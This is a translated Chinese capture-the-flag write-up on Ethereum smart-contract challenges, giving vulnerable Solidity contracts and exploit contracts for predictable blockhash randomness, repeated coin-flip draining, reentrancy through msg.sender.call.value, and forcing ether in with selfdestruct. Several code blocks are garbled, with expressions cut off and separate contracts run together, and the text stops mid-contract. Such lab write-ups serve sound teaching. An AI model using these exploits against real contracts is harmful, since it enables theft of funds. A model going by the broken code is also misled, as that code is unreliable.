# innovation blockchain 智能合约题目（下）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
* * *
## 前言：
上一篇我们主要介绍了一些基础知识以及技能。和题目做题方法。
接下来这篇文章将讲述接下来的5道题目。
主要以主流漏洞以及脚本编写为主。也会给出源代码分析以及exp
* * *
## Lottery
题目不是很长
给出以下源代码
    pragma solidity 0.4.24;
    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";
    contract Lottery is CtfFramework{
        using SafeMath for uint256;
        uint256 public totalPot;
        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            totalPot = totalPot.add(msg.value);
        }
        function() external payable ctf{
            totalPot = totalPot.add(msg.value);
        }
        function play(uint256 _seed) external payable ctf{
            require(msg.value >= 1 finney, "Insufficient Transaction Value");
            totalPot = totalPot.add(msg.value);
            bytes32 entropy = blockhash(block.number);
            bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
            bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
            bytes32 guess = keccak256(abi.encodePacked(_seed));
            if(guess==target){
                //winner
                uint256 payout = totalPot;
                totalPot = 0;
                msg.sender.transfer(payout);
            }
        }    
    }
可以发现这里transfer 需要 首先转账大于 1 finney
后面就是比较经典的漏洞。随机数预测 只需要直接照抄即可。
可能前面大家会发现合约调用发现revert问题，是因为没有给予做题权限，
我们要在这里的`ctf_challenge`给我们的合约一个做题权限。
给出exp
    contract hack{
        address target=challenge address;
        Lottery A=Lottery(target);
        constructor()payable{}
        function exp()payable{
            bytes32 entropy = block.blockhash(block.number);
            bytes32 entropy2 = keccak256(this);
            uint256 seeds = uint256(entropy^entropy2);
            A.play.value(1 finney)(seeds);
            selfdestruct(your address);
        }
        function() payable{}
    }
首先 带 2finney 部署 然后调用ctf_challenge 再调用exp就可以了。
##
## Record Label
这里主要是逻辑问题。
代码段比较长我这里只做部分摘取
        function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf{
            require(_withdrawAmount= cost.div(2), "Insufficient Funds in Game Contract");
            bytes32 entropy = blockhash(block.number-1);
            bytes1 coinFlip = entropy[0] & 1;
            if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
                //win
                gameFunds = gameFunds.sub(msg.value.div(2));
                msg.sender.transfer(msg.value.mul(3).div(2));
            }
            else {
                //loser
                gameFunds = gameFunds.add(msg.value);
            }
        }
    }
这个完全可以理解为 coinFlip == _heads （题目中不同变量类型）
总之还是 随机数的漏洞我们直接编写脚本即可。
注意每次传入的是0.1eth 然后我们可以得到 0.1*3/2 = 0.15
但是每次我传了 0.1 那么每次可以多得到0.05
为了把1 eth全赢回来需要赢得20次循环调用即可（类似薅羊毛）
    contract hack{
        address target=challenge address;
        HeadsOrTails A=HeadsOrTails(target);
        constructor()payable{}
        function exp() payable
        {
            for(uint i=1;i=startDate + numberOfWithdrawls * 365 days){
                withdrewThisYear = false;
            } 
        }
        function withdraw() external ctf{
            require(allowancePerYear > 0, "No Allowances Allowed");
            checkIfYearHasPassed();
            require(!withdrewThisYear, "Already Withdrew This Year");
            if (msg.sender.call.value(allowancePerYear)()){
                withdrewThisYear = true;
                numberOfWithdrawls = numberOfWithdrawls.add(1);
            }
        }
        function returnFunds() external payable ctf{
            require(msg.value == allowancePerYear, "Incorrect Transaction Value");
            require(withdrewThisYear==true, "Cannot Return Funds Before Withdraw");
            withdrewThisYear = false;
            numberOfWithdrawls=numberOfWithdrawls.sub(1);
        }
    }
熟悉的看了就懂了 `withdraw`处 的`msg.sender.call.value`造成的重入。
因为是先转账并且没有进行及时的修改状态造成重入
依旧写脚本
    contract hack{
        address target=challenge address;
        TrustFund A=TrustFund(target);
        uint time;
        constructor()payable{time=1;}
        function () payable{
            while(time= winner){
                msg.sender.transfer(address(this).balance);
            }
        }
    }
意思是我们需要先把里面的钱变成 5eth 以上
才能提出来所有的钱，
但是每次只能冲 1 szabo
非常少
不可能每次都用这个来冲
我们可以想到selfdestruct 这个函数 他不会引起 payable fallback的调用
所以我们充3.5eth进去
然后再转入1 szabo 即可成功。
* * *
## 小结：
这里的五道题大概是比较简单的难度。
一定程度的教会了 一些简单的漏洞以及脚本的编写 和debug能力。
通过etherscan等网站可以快速定位我们的代码问题以及调用效果等等。
最后我会详细介绍下后三道题 是相对来说难度较大一些的题目。
里面涉及到了字节码以及内联汇编 和block等问题。
那么接下来的三道题目难度会提升一个档，可以更加深入的理解合约以及区块链相关的知识。
* * *
## Rainy Day Fund
合约代码给出
    pragma solidity 0.4.24;
    import "../CtfFramework.sol";
    contract DebugAuthorizer{
        bool public debugMode;
        constructor() public payable{
            if(address(this).balance == 1.337 ether){
                debugMode=true;
            }
        }
    }
    contract RainyDayFund is CtfFramework{
        address public developer;
        mapping(address=>bool) public fundManagerEnabled;
        DebugAuthorizer public debugAuthorizer;
        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development
            debugAuthorizer = new DebugAuthorizer();
            developer = msg.sender;
            fundManagerEnabled[msg.sender] = true;